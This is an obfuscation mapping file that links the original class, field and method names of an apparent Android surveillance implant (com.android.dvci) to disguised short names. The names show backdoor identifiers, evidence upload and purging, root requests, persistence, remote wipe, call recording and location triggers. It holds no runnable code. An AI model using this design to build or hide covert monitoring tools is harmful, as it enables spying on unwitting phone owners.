android.media.AmrInputStream -> android.media.AmrInputStream:
    975:990:com.android.dvci.util.ExecuteResult resetPassword() -> au
    994:1045:void parseExecute(byte[]) -> openfile
    1051:1094:void purgeEvidences(java.lang.String,java.util.Date,int) -> Code
    1107:1164:void sendEvidences(java.lang.String) -> eval
    1167:1198:boolean sendEvidence(com.android.dvci.file.AutoFile) -> Code
    1203:1274:boolean sendResumeEvidence(com.android.dvci.file.AutoFile) -> localvar
    1279:1296:int adaptChunk(int,long,long) -> Code
    1300:1301:void writeBuf$7dd4fa8e(byte[],byte[]) -> Code
    1304:1305:void writeBuf(byte[],int,int) -> localvar
    1308:1309:void writeBuf$5c8eef6e(byte[],byte[]) -> localvar
    1319:1319:boolean parseLog(byte[]) -> closefile
    1330:1337:int parseLogOffset(byte[]) -> constants
    1347:1348:void parseEnd(byte[]) -> globalize
    1361:1361:byte[] command(int) -> zygoteclass
    1379:1396:byte[] command(int,byte[]) -> Code
    1424:1436:byte[] cypheredWriteReadSha(byte[]) -> main
    1448:1463:boolean checkOk(byte[]) -> lua
com.android.dvci.auto.Cfg -> kso.magic:
    boolean BLACKBERRY -> aP
    boolean PERSISTENCE -> aQ
    boolean DEMO -> aR
    boolean DEMO_SILENT -> aS
    boolean FILE -> aT
com.android.dvci.conf.ChildConf -> kso.checksum:
com.android.dvci.conf.ConfAction -> kso.signature:
    int subActionId -> aU
    int actionId -> actionId
com.android.dvci.conf.ConfEvent -> kso.file_size:
    int eventId -> W
    int startAction -> aV
    int endAction -> aW
    int repeatAction -> aX
    int iter -> aY
    int delay -> delay
    java.lang.String desc -> U
    boolean enabled -> enabled
    70:70:int getId() -> getId
com.android.dvci.conf.Configuration -> kso.header_size:
    java.lang.String shellFileBase -> aZ
    java.lang.String shellFile -> ba
    java.lang.String oldShellFileBase -> bb
    com.android.dvci.Status status -> ah
    java.lang.String jsonResource -> bc
    95:112:boolean loadConfiguration(boolean) -> myvar
    127:156:boolean parseConfiguration(boolean,java.lang.String) -> Code
    163:173:void loadGlobals$11791e8b(org.json.JSONObject) -> Code
    194:245:java.lang.String decryptConfiguration(byte[]) -> lua_main
    253:255:void cleanConfiguration() -> av
    30:30:com.android.dvci.Status access$000(com.android.dvci.conf.Configuration) -> Code
com.android.dvci.conf.Configuration$LoadAction -> kso.header_size$Code:
    com.android.dvci.conf.Configuration this$0 -> bd
    371:400:void call(int,org.json.JSONObject) -> Code
com.android.dvci.conf.Configuration$LoadEvent -> kso.header_size$localvar:
    com.android.dvci.conf.Configuration this$0 -> bd
    344:361:void call(int,org.json.JSONObject) -> Code
com.android.dvci.conf.Configuration$LoadModule -> kso.header_size$localclass:
    com.android.dvci.conf.Configuration this$0 -> bd
    321:331:void call(int,org.json.JSONObject) -> Code
com.android.dvci.conf.Configuration$Visitor -> kso.header_size$instance:
    boolean instantiate -> be
    268:309:void load(org.json.JSONArray,com.android.dvci.conf.Configuration$Visitor) -> Code
    void call(int,org.json.JSONObject) -> Code
com.android.dvci.conf.ConfigurationException -> kso.endian_tag:
com.android.dvci.conf.Globals -> kso.link_size:
    int quotaMin -> bf
    int quotaMax -> bg
    boolean wipe -> bh
    java.lang.String type -> type
com.android.dvci.conf.JSONConf -> kso.link_off:
    java.lang.String type -> type
    org.json.JSONObject params -> bi
    45:45:java.lang.String getType() -> getType
    50:61:int getInt(java.lang.String) -> getInt
    67:78:double getDouble(java.lang.String) -> getDouble
    84:95:java.lang.String getString(java.lang.String) -> getString
    101:106:java.lang.String getString(java.lang.String,java.lang.String) -> getString
    113:146:java.util.Date getDate(java.lang.String) -> fingerprint
    152:157:java.util.Date getDate$443e4ea9(java.lang.String) -> openfile
    197:208:boolean getBoolean(java.lang.String) -> getBoolean
    214:216:boolean getBoolean$505cbf47(java.lang.String) -> closefile
    240:242:java.lang.String getSafeString(java.lang.String) -> constants
    247:255:com.android.dvci.conf.ChildConf getChild(java.lang.String) -> globalize
    259:259:boolean has(java.lang.String) -> has
    264:264:java.lang.String toString() -> toString
com.android.dvci.crypto.Crypto -> kso.map_off:
    byte[] aes_key -> bj
    javax.crypto.spec.SecretKeySpec skey_spec -> bk
    javax.crypto.spec.IvParameterSpec ivSpec -> bl
    javax.crypto.Cipher cipherEnc -> bm
    javax.crypto.Cipher cipherDec -> bn
    byte[] $ -> $
    116:120:byte[] encrypt(byte[]) -> lua_and
    143:165:byte[] encrypt$3cca580f(byte[],byte[]) -> localclass
    206:223:byte[] decrypt$7dcc7401(byte[],int) -> mylist
    java.lang.String $(int,int,int) -> $
com.android.dvci.crypto.CryptoCBC -> kso.string_ids_size:
    javax.crypto.Cipher cipherEnc -> bm
    javax.crypto.Cipher cipherDec -> bn
    byte[] aes_key -> bj
    javax.crypto.spec.SecretKeySpec skey_spec -> bk
    javax.crypto.spec.IvParameterSpec ivSpec -> bl
    68:72:byte[] encrypt(byte[]) -> lua_and
    86:87:byte[] decrypt$7dcce860(byte[],long) -> Code
com.android.dvci.crypto.CryptoException -> kso.string_ids_off:
com.android.dvci.crypto.Encryption -> kso.type_ids_size:
    com.android.dvci.crypto.Crypto crypto -> bo
    54:54:java.lang.String decryptName(java.lang.String,int) -> localvar
    69:69:java.lang.String encryptName(java.lang.String,int) -> localclass
    83:90:int getNextMultiple(int) -> mymethod
    108:147:java.lang.String scramble(java.lang.String,int,boolean) -> Code
    161:171:void makeKey(byte[]) -> lua_break
    215:237:byte[] decryptData$7dcc7401(byte[],int) -> myarray
    248:248:byte[] encryptData(byte[]) -> lua_do
    267:283:byte[] encryptData$7dcc7401(byte[],int) -> invoked
    287:303:byte[] appendData$3f345f1a(byte[],int,byte[]) -> Code
    318:318:byte[] pad$7dcc7401(byte[],int) -> zygoteapp
    335:347:byte[] pad$3bd799e5$7dcc7401(byte[],int) -> zygotevar
    266:296:java.util.ArrayList getInstalledApps$2a667459() -> aw
com.android.dvci.crypto.EncryptionPKCS5 -> kso.type_ids_off:
    com.android.dvci.crypto.CryptoCBC crypto -> bp
    65:71:void init(byte[]) -> init
    102:109:byte[] decryptData$7dcce860$1cf9656b(byte[]) -> lua_else
    121:135:byte[] encryptDataIntegrity(byte[]) -> lua_elseif
    151:178:byte[] decryptDataIntegrity(byte[]) -> lua_end
    183:183:byte[] decryptData(byte[]) -> lua_false
    189:208:byte[] encryptData(byte[]) -> lua_do
com.android.dvci.crypto.Keys -> kso.proto_ids_size:
    com.android.dvci.crypto.Keys singleton -> bq
    byte[] instanceId -> br
    byte[] backdoorId -> bs
    byte[] aesKey -> bt
    byte[] confKey -> bu
    byte[] challengeKey -> bv
    byte[] demoMode -> bw
    byte[] rootRequest -> bx
    byte[] persistence -> by
    java.lang.Object keysLock -> bz
    95:106:com.android.dvci.crypto.Keys self() -> ax
    185:196:boolean isPersistent() -> isPersistent
    204:215:boolean isDemo() -> ay
    219:236:boolean wantsPrivilege() -> az
    240:240:byte[] getRootRequest() -> aA
    266:266:byte[] getAesKey() -> aB
    275:275:byte[] getChallengeKey() -> aC
    284:284:byte[] getConfKey() -> aD
    293:293:byte[] getInstanceId() -> aE
    302:302:byte[] getBuildId() -> aF
    312:321:byte[] getSubtype() -> aG
    355:358:boolean enabled() -> enabled
com.android.dvci.crypto.SHA1Digest -> kso.proto_ids_off:
    java.security.MessageDigest digest -> digest
    67:67:byte[] getDigest() -> aH
    77:78:void update(byte[]) -> update
    81:83:byte[] get(byte[]) -> lua_for
com.android.dvci.db.GenericSqliteHelper -> kso.field_ids_size:
    java.lang.Object lockObject -> bA
    java.lang.String name -> name
    android.database.sqlite.SQLiteDatabase db -> bB
    boolean isCopy -> bC
    52:53:com.android.dvci.db.GenericSqliteHelper open(java.lang.String,java.lang.String) -> localvar
    57:64:com.android.dvci.db.GenericSqliteHelper open(java.io.File) -> Code
    76:92:com.android.dvci.db.GenericSqliteHelper openCopy(java.lang.String) -> main
    104:104:com.android.dvci.db.GenericSqliteHelper openCopy(java.lang.String,java.lang.String) -> localclass
    116:130:long traverseRawQuery(java.lang.String,java.lang.String[],com.android.dvci.db.RecordVisitor) -> Code
    134:134:long traverseRecords(java.lang.String,com.android.dvci.db.RecordVisitor) -> Code
    145:164:long traverseRecords(java.lang.String,com.android.dvci.db.RecordVisitor,boolean) -> Code
    172:194:long traverse(android.database.Cursor,com.android.dvci.db.RecordVisitor,java.lang.String[]) -> Code
    199:235:android.database.sqlite.SQLiteDatabase getReadableDatabase() -> getReadableDatabase
    241:255:void disposeDb() -> aI
com.android.dvci.db.RecordGroupsVisitor -> kso.field_ids_off:
    boolean extended -> bD
    com.android.dvci.module.chat.ChatGroups groups -> bE
    22:32:long cursor(android.database.Cursor) -> Code
com.android.dvci.db.RecordHashPairVisitor -> kso.method_ids_size:
    java.util.Hashtable map -> bF
    16:16:java.util.Hashtable getMap() -> aJ
    21:24:long cursor(android.database.Cursor) -> Code
    28:28:java.lang.String get(java.lang.String) -> get
    32:32:boolean containsKey(java.lang.String) -> containsKey
com.android.dvci.db.RecordHashtableIdVisitor -> kso.method_ids_off:
    java.util.TreeMap tree -> bG
    java.lang.String key -> bH
    24:36:long cursor(android.database.Cursor) -> Code
com.android.dvci.db.RecordListVisitor -> kso.class_defs_size:
    java.util.ArrayList list$7865b31 -> T
    17:17:java.util.ArrayList getList$5679c1ce() -> aK
    22:24:long cursor(android.database.Cursor) -> Code
com.android.dvci.db.RecordStringVisitor -> kso.class_defs_off:
    java.util.ArrayList records$7865b31 -> bI
    24:24:java.util.ArrayList getRecords$5679c1ce() -> aL
    29:30:void init() -> init
    35:35:void close() -> close
    40:43:long cursor(android.database.Cursor) -> Code
com.android.dvci.db.RecordVisitor -> kso.data_size:
    java.lang.String[] tables -> bJ
    int count -> count
    java.lang.String[] projection -> projection
    java.lang.String selection -> selection
    java.lang.String order -> bK
    34:34:void init() -> init
    37:37:void close() -> close
    long cursor(android.database.Cursor) -> Code
    44:47:void init(java.lang.String[],int) -> Code
    50:50:java.lang.String[] getProjection() -> getProjection
    54:54:java.lang.String getSelection() -> getSelection
    58:58:java.lang.String getOrder() -> aM
    62:62:boolean isStopRequested() -> Q
com.android.dvci.event.BaseEvent -> kso.data_off:
    boolean isActive -> bL
    com.android.dvci.event.BaseEvent$Alarm alarm -> bM
    java.lang.String subType -> bN
    com.android.dvci.conf.ConfEvent conf -> bO
    int iterCounter -> bP
    boolean parse(com.android.dvci.conf.ConfEvent) -> localvar
    137:137:int getId() -> getId
    141:141:java.lang.String getType() -> getType
    155:160:boolean setConf(com.android.dvci.conf.ConfEvent) -> localclass
    165:177:boolean trigger(int) -> myclass
    186:186:int getConfPeriod() -> aN
    191:236:void onEnter() -> aO
    242:247:void stopAlarm() -> aP
    255:274:void onExit() -> aQ
    289:289:boolean triggerStartAction() -> aR
    299:299:boolean triggerEndAction() -> aS
    311:311:boolean triggerRepeatAction() -> aT
    316:316:java.lang.String toString() -> toString
    320:320:boolean isEnabled() -> isEnabled
    324:324:java.lang.String getSubType() -> aU
    328:329:void setSubType(java.lang.String) -> lua
    30:30:int access$000(com.android.dvci.event.BaseEvent) -> Code
    30:30:void access$100(com.android.dvci.event.BaseEvent) -> localvar
    30:30:boolean access$200(com.android.dvci.event.BaseEvent) -> localclass
com.android.dvci.event.BaseEvent$Alarm -> kso.data_off$Code:
    int count -> count
    com.android.dvci.event.BaseEvent this$0 -> bQ
    65:106:void onReceive(android.content.Context,android.content.Intent) -> onReceive
    112:121:void SetAlarm(int,int) -> localvar
    124:133:void CancelAlarm() -> aV
com.android.dvci.event.BaseTimer -> kso.a:
com.android.dvci.event.EventAc -> kso.b:
    boolean inRange -> bR
    28:29:void actualStart() -> M
    33:35:void actualStop() -> N
    40:40:void actualGo() -> L
    45:45:boolean parse(com.android.dvci.conf.ConfEvent) -> localvar
    55:73:int notification(com.android.dvci.Ac) -> Code
    19:19:int notification(java.lang.Object) -> Code
com.android.dvci.event.EventAfterinst -> kso.c:
    int days -> bS
    java.util.Date date -> bT
    21:39:boolean parse(com.android.dvci.conf.ConfEvent) -> localvar
    44:59:void actualStart() -> M
    63:64:void actualStop() -> N
    68:69:void actualGo() -> L
com.android.dvci.event.EventBattery -> kso.d:
    int minLevel -> minLevel
    int maxLevel -> maxLevel
    boolean inRange -> bR
    29:30:void actualStart() -> M
    34:36:void actualStop() -> N
    41:59:boolean parse(com.android.dvci.conf.ConfEvent) -> localvar
    64:64:void actualGo() -> L
    71:95:int notification(com.android.dvci.Battery) -> Code
    20:20:int notification(java.lang.Object) -> Code
com.android.dvci.event.EventCall -> kso.e:
    java.lang.String number -> openfile
    boolean inCall -> bU
    android.media.MediaRecorder recorder -> bV
    33:34:void actualStart() -> M
    38:40:void actualStop() -> N
    45:63:boolean parse(com.android.dvci.conf.ConfEvent) -> localvar
    69:69:void actualGo() -> L
    73:114:int notification(com.android.dvci.Call) -> Code
    22:22:int notification(java.lang.Object) -> Code
com.android.dvci.event.EventCellId -> kso.f:
    int mccOrig -> bW
    int mncOrig -> bX
    int lacOrig -> bY
    int cidOrig -> bZ
    boolean entered -> ca
    36:37:void actualStart() -> M
    41:42:void actualStop() -> N
    47:81:boolean parse(com.android.dvci.conf.ConfEvent) -> localvar
    86:125:void actualGo() -> L
com.android.dvci.event.EventConnectivity -> kso.g:
    boolean active -> cb
    28:29:void actualStart() -> M
    33:36:void actualStop() -> N
    40:40:boolean parse(com.android.dvci.conf.ConfEvent) -> localvar
    46:46:void actualGo() -> L
    55:73:int notification(com.android.dvci.Connectivity) -> Code
    19:19:int notification(java.lang.Object) -> Code
com.android.dvci.event.EventDate -> kso.h:
    java.util.Date dateFrom -> cc
    java.util.Date dateTo -> cd
    java.util.Calendar start -> ce
    java.util.Calendar stop -> cf
    boolean nextDailyIn -> cg
    boolean needExitOnStop -> ch
    27:44:boolean parse(com.android.dvci.conf.ConfEvent) -> localvar
    53:77:void actualStart() -> M
    80:118:boolean setDailyDelay(boolean) -> sort
    127:146:void actualGo() -> L
    154:157:void actualStop() -> N
com.android.dvci.event.EventLocation -> kso.i:
    int distance -> ci
    float latitudeOrig -> cj
    float longitudeOrig -> ck
    com.android.dvci.module.position.GPSLocatorDistance locator$4b0f3e8f -> cl
